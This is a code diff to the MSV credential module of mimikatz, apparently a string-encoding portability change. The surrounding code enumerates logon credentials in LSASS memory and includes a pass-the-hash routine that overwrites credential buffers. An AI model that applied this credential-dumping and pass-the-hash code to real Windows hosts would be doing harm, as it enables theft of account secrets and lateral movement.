@@ -9,7 +9,7 @@ const ANSI_STRING
 	PRIMARY_STRING = {7, 8, "Primary"},
 	CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, "lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_single_package[] = {&kuhl_m_sekurlsa_msv_package};
 
 NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
@@ -72,7 +72,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CON
 			kprintf(L"data copy @ %p : ", origBufferAddress->address);
 			if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
 				kprintf(L"OK !");
-			else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+			else PRINT_ERROR_AUTO_C("kull_m_memory_copy");
 		}
 	}
 	else kprintf(L".");
@@ -119,11 +119,11 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID 
 						}
 						LocalFree(primaryCredentials.Credentials.Buffer);
 					}
-				} else kprintf(L"n.e. (KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
+				} else kprintf(L"%hs", "n.e. (KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
 				aLsassMemory.address = primaryCredentials.next;
 			}
 			aLsassMemory.address = credentials.next;
-		} else kprintf(L"n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
+		} else kprintf(L"%hs", "n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
 	}
 }
 
